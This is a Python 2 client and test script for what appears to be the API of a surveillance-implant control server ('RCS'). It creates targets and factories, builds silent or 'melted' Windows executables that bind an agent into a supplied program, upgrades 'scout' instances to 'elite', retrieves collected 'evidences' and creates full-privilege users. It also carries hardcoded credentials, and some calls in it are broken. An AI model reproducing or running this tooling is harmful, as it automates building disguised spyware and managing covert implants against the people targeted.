import urllib2
from urllib2 import HTTPError
import cookielib
import json
import pprint
from time import sleep

pp = pprint.PrettyPrinter(indent=4)

class Rcs_client:

    def __init__(self, host, user, passwd):
        self.host = host
        self.user = user
        self.passwd = passwd
        #self.cookie = self.do_login

    def _get_response(self, link, cookies = None):
        """ Basic HTTP Request/Response with Cookie
        @param link
        @param cookie
        @returns response page
        """
        try:
            req = urllib2.Request(link)
            if cookies:
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookies))
            resp = opener.open(req).read()
            sleep(1)
            return resp
        except HTTPError as e:
            print  "ERROR: processing %s: %s, %s" % (link, e, e.read())
            raise e
            
    def _post_response(self, link, cj, data=None):
        """ Basic POST Request / Response
        @param link
        @param data
        @param cookie
        @returns response page
        """
        try:
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), 
                    urllib2.HTTPHandler() )
            req = urllib2.Request(link, data)
            resp = opener.open(req).read()
            sleep(1)
            return resp
        except HTTPError as e:
            print "ERROR: processing %s: %s, %s" % (link, e, e.read())
            raise e

    def _call(self, api_name, data={}, binary = False, argjson = True):
        link = 'https://%s/%s' % (self.host, api_name)
        #print "binary %s, argjson %s" % (binary, argjson)
        arg = data
        if argjson:
            arg = json.dumps(data)

        resp = self._post_response(link, self.cookie, arg)
        if binary:
            return resp 

        try:            
            result = json.loads(resp)
            return result
        except Exception, e:
            print "ERROR: %s" % e
            print "call error: %s" % resp
            raise e

    def _call_get(self, api_name):
        link = 'https://%s/%s' % (self.host, api_name)
        resp = self._get_response(link, self.cookie)
        result = json.loads(resp)
        return result
        
    def login(self):
        """ Do Login request to catch cookie
        @param link: url to login page
        @param data: post data
        @returns cookie 
        """
        login = { 'user':self.user,
                  'pass':self.passwd, 
                  'version':2013031101}
        
        link = "https://%s/auth/login" % self.host
        data = json.dumps(login)
        cj = cookielib.CookieJar()
        self._post_response(link, cj, data)

        self.cookie = cj
        return cj
        
    def logout(self):
        """ Logout for session
        @param session cookie
        @return True/False
        """
        self._call('auth/logout')
        return True

    def server_status(self):
        status = self._call_get('status/counters')
        return status

    def operation(self, operation):
        """ gets the operation id of an operation """
        operations = self._call_get('operation')
        print "DBG operation: %s" % operations
        ret = [ (op['_id'],op['group_ids']) for op in operations if op['name'] == operation ]
        return ret[0] if ret else None

    def targets(self, operation_id, target=None):
        """ gets the targets id of an operation, matching the target name """
        targets = self._call_get('target')
        #pp = pprint.PrettyPrinter(indent=4)
        #pp.pprint(targets)
        if target:
            ret = [ op['_id'] for op in targets if op['name'] == target and op['path'][0] == operation_id ]
        else:
            ret = [ op['_id'] for op in targets if op['path'][0] == operation_id ]
        return ret

    def factories(self, target_id):
        """ gets the factories of an operation, matching the target id """
        factories = self._call_get('factory')

        #pp.pprint(factories)
        ret = [ (op['_id'], op['ident']) for op in factories if target_id in op['path'] ]
        return ret

    def instances(self, ident):
        """ gets the instances id of an operation, matching the ident """
        agents = self._call_get('agent')
        #pp.pprint(agents)
        ret = [ op['_id'] for op in agents if ident in op['ident'] and op['_kind'] == 'agent' ]
        return ret

    def agents(self, target_id):
        """ gets the agents (agents and factories) of an operation, matching the target id """
        agents = self._call_get('agent')
        #pp.pprint(agents)
        ret = [ (op['_id'], op['ident'], op['name']) for op in agents if target_id in op['path']]
        return ret

    # user list : verifica presenza utente
    # add group to user
    def user_create(self, name, password, privs, group_id):
        """ Create a user """
        try:
            data = {'name': name, 'pass': password, 'group_ids': [group_id], 'privs': privs, 'enabled': True }
            user =  self._call('user/create', data)
            return user['_id']
        except HTTPError as e:
            if e.code == 409:
                return True
            print e
            return False

    def target_delete(self, target_id):
        """ Delete a given target """
        return self._call('target/destroy', {'_id': target_id })

    def target_create(self, operation_id, name, desc):
        """ Create a given target """
        data = {'name': name, 'desc': desc, 'operation': operation_id }
        target =  self._call('target/create', data)
        return target['_id']

    def factory_create(self, operation_id, target_id, ftype, name, desc):
        """ Create a factory """
        data = {'name': name, 'desc': desc, 'operation': operation_id, 'target': target_id, 'type': ftype }
        factory = self._call('agent/create', data)
        return factory['_id'], factory['ident']

    def factory_add_config(self, factory_id, config):
        """ adds a config to a factory """
        data = {'_id': factory_id, 'config': config }
        return self._call('agent/add_config', data)

    def update_conf(self, conf_file, factory):
        """ Update sync configuration
        @param configuration file
        @param factory id
        @return True/False
        """
        try:
            base = 'https://%s' % self.host
            
            faclink = '%s/factory' % base
            resp = self._get_response(faclink, self.cookie)
            facts = json.loads(resp)
            for fact in facts:
                if fact["ident"] == factory:
                    fct = fact
                    break
            if not fct:
                return False
            #print fct
            addlink = '%s/agent/add_config' % base
            f = open(conf_file, 'r')
            cnf = f.read()
            data = {'_id':fct["_id"], 'config':cnf }
            #print data
            resp = self._post_response(addlink, self.cookie, json.dumps(data))

            return True
        except Exception as e:
            print e
            return False

    def instance_upgrade(self, instance_id):
        params = {'_id': instance_id }
        try:
            self._call('agent/upgrade', params)
            return True
        except:
            return False

    def instance_info(self, instance_id):
        agents = self._call_get('agent')
        #pp.pprint(agents)
        ret = [ op for op in agents if op['_id'] == instance_id ]
        return ret[0] if ret else None

    def instance_close(self, instance_id):
        params = {'_id': instance_id, 'status':'closed' }
        self._call('agent/update', params)

    def instance_delete(self, instance_id):
        """ Delete a given instance
        @param instance
        """
        data = {'_id': instance_id, 'permanent':True }
        return self._call('agent/destroy', data)
        #print resp
        

    def evidences(self, target, agent, type):
        """ Get evidences of given agent and target
        @param target
        @param agent
        @param type (if None all types should be returned)
        """
        f = { "type":"['']", "target":target, "agent":agent[1] }
        filter = json.dumps(f)
        #print urllib.quote(filter)
        link  = 'https://%s/evidence?filter=%s' % (self.host, filter)
        resp  = self._get_response(link, self.cookie)
        
        print resp
    
    def build(self, factory, params, out_file):
        """ Build Silent Exe 
        @param param_file 
        @param factory
        @param out_file
        """

        params['factory'] = { "_id": "%s" % factory } 
        #print "+ Build params: \n%s" % params

        resp = self._call('build', params, binary = True)
        
        out = open(out_file, 'wb')
        out.write(resp)
        
        #print "+ %s bytes saved to %s" % (len(out),  out_file)

    def build_melt(self, factory, params, melt_file, out_file):
        """ Build Melted Exe 
        @param param_file 
        @param factory
        @param out_file
        """

        params['factory'] = { "_id": "%s" % factory } 

        f = open(melt_file, "rb")
        payload = f.read()
        print "DBG payload size: ", len(payload), " file: ", melt_file
        melt_id = self._call('upload', payload, binary = True, argjson = False)
        print "DBG uploaded: ", melt_id

        params['melt']['input'] = melt_id
        #:  Build: melting: {"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true, "input"=>"4f60909baef1de0e4800000a-1361192221.897401094"}

        print "DBG Build melt params: \n%s" % params
        #link  = 'https://%s/build' % self.host
        #resp = self.post_response(link, json.dumps(params))
        resp = self._call('build', params,  binary = True)
        
        out = open(out_file, 'wb')
        out.write(resp)
        
        #print "+ %s bytes saved to %s" % (len(out),  out_file)

def testMelt():
    print 'test'
    host = "rcs-minotauro"
    user = "avmonitor"
    passwd = "avmonitorp123"
    conn = Rcs_client(host, user, passwd)
    print conn.login()
 
    if(False):
        operation, target, factory = '51222810aef1de0f040003f9','51222b77aef1de0f040005d0','51222b79aef1de0f040005d4'
        config = open('assets/config.json').read()
        conn.factory_add_config(factory, config)

    else:
        operation = conn.operation('AVMonitor')
        targets = conn.targets(operation, "Mazurca")

        for t in targets:
            print "delete target: ", t
            conn.target_delete(t)

        print "remained targets: ", conn.targets(operation, "Mazurca")

        target = conn.target_create(operation,'Mazurca','la mia musica')
        factory = conn.factory_create(operation, target, 'desktop', 'Bella fattoria', 'degli animali')
        print "factory: ", factory
        #sleep(10)
 
        config = open('assets/config.json').read()
        conn.factory_add_config(factory, config)

        
        print "targets: " , targets
 
    param = { 'platform': 'windows',
          'binary': { 'demo' : False, 'admin' : False},
          'melt' : {'scout' : True, 'admin' : False, 'bit64' : True, 'codec' : True },
          'sign' : {}
          }
 
    #{"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true}
    try:
        #r = conn.build(factory, param, 'build.out')
        print "build"
        r = conn.build_melt(factory, param, 'assets/meltapp.exe', 'build.out')

    except Exception, e:
        print e
    
 
    r = conn.enum_instances( factory )
    print "instances: ",r
 
    #sleep(5)
    conn.target_delete(target)
    print "'%s','%s','%s' " % (operation, target, factory)
    print conn.logout()

def test():
    import socket
    import time

    print 'test'
    host = "rcs-minotauro"
    user = "avmonitor"
    passwd = "avmonitorp123"
    conn = Rcs_client(host, user, passwd)
    print conn.login()

    print conn.server_status()

    hostname = socket.gethostname()
    print "%s %s\n" % (hostname, time.ctime())
    target = 'VM_%s' % hostname

    operation_id, group_id = conn.operation('AVMonitor')
    print group_id
    privs = ['ADMIN','ADMIN_USERS','ADMIN_OPERATIONS','ADMIN_TARGETS','ADMIN_AUDIT','ADMIN_LICENSE','SYS','SYS_FRONTEND','SYS_BACKEND','SYS_BACKUP','SYS_INJECTORS','SYS_CONNECTORS','TECH','TECH_FACTORIES','TECH_BUILD','TECH_CONFIG','TECH_EXEC','TECH_UPLOAD','TECH_IMPORT','TECH_NI_RULES','VIEW','VIEW_ALERTS','VIEW_FILESYSTEM','VIEW_EDIT','VIEW_DELETE','VIEW_EXPORT','VIEW_PROFILES'] 
        
    user_id = conn.user_create("avmonitor_zeno", passwd, privs, group_id)
    user = "avmonitor_zeno"
    print "user_id: ", user_id
    conn.logout()

    # login with new user
    conn = Rcs_client(host, user, passwd)
    print conn.login()

    #exit(0)

    t_id = conn.target_create(operation_id, target, "Dammy")
    print "t_id: ", t_id

    targets = conn.targets(operation_id, target)
    for target_id in targets:
        print "targets: ", targets

        factories = conn.factories( target_id )
        print "factories: ", factories

        for factory_id, ident in factories:
            print "factory_id ", factory_id, ident
            instances = conn.instances( ident )
            print "instances: ", instances

            for instance_id in instances:
                print "info %s" % instance_id
                info = conn.instance_info(instance_id)
                print info
                assert info['scout'] == True

                print "upgrade elite"
                res = conn.instance_upgrade(instance_id)
                print "res: %s" % res

                info = conn.instance_info(instance_id)
                print info
                if res:
                    assert info['upgradable'] == True

if __name__ == "__main__":
    import logger
    logger.setLogger(debug=True)
    test()
